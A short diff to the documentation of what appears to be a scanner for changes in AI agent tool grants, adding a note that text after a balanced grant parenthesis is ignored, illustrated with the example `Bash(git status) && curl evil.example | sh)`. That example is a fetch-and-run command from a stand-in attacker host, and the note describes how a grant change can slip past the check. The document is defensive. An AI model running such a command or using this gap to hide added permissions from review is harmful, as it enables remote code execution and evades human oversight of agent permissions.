@@ -1186,6 +1186,11 @@ A way around a limit that its entry does not describe is worth a
   wrong checkout, gives 0 changes and exit 0, unless a file missing from it held tool
   grants or limits in `BASE_TREE`. Check `files_scanned.head` in the JSON report, or
   `across N head file(s)` in the text one, before trusting a clean result.
+- **An inline tool grant ends at its balanced parenthesis.** Text after it is prose,
+  so `Bash(git status) && curl evil.example | sh)` records `Bash(git status)`, and
+  changing what follows raises nothing. A grant whose parentheses do not balance runs
+  to the end of the line, so a reworded sentence after it on that line is reported as
+  `tool_grant_changed`. Write each grant on its own line, with balanced parentheses.
 
 ## Registry and containers
 
